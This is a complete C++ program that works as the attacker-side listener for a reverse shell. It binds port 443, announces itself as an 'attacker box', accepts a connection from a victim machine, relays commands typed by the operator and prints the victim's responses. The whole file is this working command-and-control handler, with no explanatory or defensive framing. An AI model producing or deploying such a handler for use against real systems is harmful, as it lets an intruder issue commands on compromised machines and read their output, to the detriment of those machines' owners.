#include <iostream>
#include <cstring>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main() {
    int serverPort = 443;
    int serverSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSocket < 0) {
        perror("Socket creation failed");
        return 1;
    }

    int opt = 1;
    if (setsockopt(serverSocket, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
        perror("setsockopt failed");
        close(serverSocket);
        return 1;
    }

    sockaddr_in serverAddr{};
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(serverPort);

    if (bind(serverSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
        perror("Bind failed");
        close(serverSocket);
        return 1;
    }

    if (listen(serverSocket, 1) < 0) {
        perror("Listen failed");
        close(serverSocket);
        return 1;
    }

    std::cout << "Attacker box listening and awaiting instructions\n";

    sockaddr_in clientAddr{};
    socklen_t clientLen = sizeof(clientAddr);
    int connectionSocket = accept(serverSocket, (sockaddr*)&clientAddr, &clientLen);
    if (connectionSocket < 0) {
        perror("Accept failed");
        close(serverSocket);
        return 1;
    }

    std::cout << "Thanks for connection to me: " << inet_ntoa(clientAddr.sin_addr) << "\n";

    char buffer[1024] = {0};
    int bytesReceived = recv(connectionSocket, buffer, sizeof(buffer) - 1, 0);
    if (bytesReceived > 0) {
        buffer[bytesReceived] = '\0';
        std::cout << buffer << std::endl;
    }

    std::string command;
    while (true) {
        std::cout << "Please enter a command: ";
        std::getline(std::cin, command);
        if (command == "exit") {
            break;
        }

        send(connectionSocket, command.c_str(), command.length(), 0);

        memset(buffer, 0, sizeof(buffer));
        bytesReceived = recv(connectionSocket, buffer, sizeof(buffer) - 1, 0);
        if (bytesReceived <= 0) {
            std::cout << "Connection closed or error occurred.\n";
            break;
        }
        buffer[bytesReceived] = '\0';
        std::cout << buffer << std::endl;
    }

    shutdown(connectionSocket, SHUT_RDWR);
    close(connectionSocket);
    close(serverSocket);

    return 0;
}
